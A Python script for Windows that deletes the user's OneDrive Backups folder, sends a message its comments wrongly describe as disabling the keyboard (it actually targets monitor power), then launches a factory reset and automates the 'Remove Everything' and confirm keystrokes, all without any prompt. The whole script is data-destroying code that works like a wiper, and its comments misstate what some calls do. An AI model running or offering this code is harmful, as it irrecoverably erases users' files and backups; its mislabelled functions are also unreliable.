import os
import shutil
import subprocess
import pyautogui
import time
import win32api
import win32con
import win32gui

# Define the path to the OneDrive folder
onedrive_path = os.path.expanduser('~/OneDrive')
backup_folder_name = 'Backups'  # Name of the folder where backups are stored
backup_folder_path = os.path.join(onedrive_path, backup_folder_name)

# Function to check and remove backups from OneDrive
def remove_onedrive_backups():
    if os.path.exists(backup_folder_path):
        print(f"Found backup folder at: {backup_folder_path}")
        try:
            shutil.rmtree(backup_folder_path)
            print("Backups removed successfully.")
        except PermissionError as e:
            print(f"Permission error while removing backups: {e}")
        except FileNotFoundError as e:
            print(f"File not found error while removing backups: {e}")
        except Exception as e:
            print(f"Failed to remove backups: {e}")
    else:
        print("No backup folder found in OneDrive.")

# Function to disable the keyboard
def disable_keyboard():
    try:
        # Disable the keyboard by setting its hardware state
        win32api.SendMessage(win32con.HWND_BROADCAST, win32con.WM_SYSCOMMAND, win32con.SC_MONITORPOWER, 2)
        print("Keyboard should now be disabled.")
    except Exception as e:
        print(f"Failed to disable keyboard: {e}")

# Function to enable the keyboard
def enable_keyboard():
    try:
        # Enable the keyboard
        win32api.SendMessage(win32con.HWND_BROADCAST, win32con.WM_SYSCOMMAND, win32con.SC_MONITORPOWER, -1)
        print("Keyboard should now be enabled.")
    except Exception as e:
        print(f"Failed to enable keyboard: {e}")

# Function to reset Windows
def reset_windows():
    try:
        # Run the command to open the Reset this PC option in Windows
        subprocess.run('systemreset -factoryreset', check=True, shell=True)
        print("Reset process initiated. Please wait...")
        
        # Wait for the reset window to appear
        time.sleep(20)  # Adjust the time as necessary for the window to appear

        # Use pyautogui to interact with the reset window
        print("Selecting 'Remove Everything' option...")
        
        # Press Tab to navigate to the options (This may need adjustment)
        pyautogui.press('tab', presses=5, interval=0.5)
        pyautogui.press('down', presses=2, interval=0.5)  # Adjust number of presses as necessary
        pyautogui.press('enter')
        
        # Additional wait time for confirmation screen
        time.sleep(5)

        print("Selection made. Confirming the reset...")
        
        # Confirm the selection
        pyautogui.press('enter')
        
        print("Reset process should now be in progress.")
    
    except subprocess.CalledProcessError as e:
        print(f"Failed to initiate reset process: {e}")
    except FileNotFoundError as e:
        print(f"Command not found: {e}")
    except Exception as e:
        print(f"An error occurred: {e}")

# Call the function to remove OneDrive backups
remove_onedrive_backups()

# Disable the keyboard
disable_keyboard()

# Call the function to reset Windows
reset_windows()

# Re-enable the keyboard after the reset process starts
enable_keyboard()


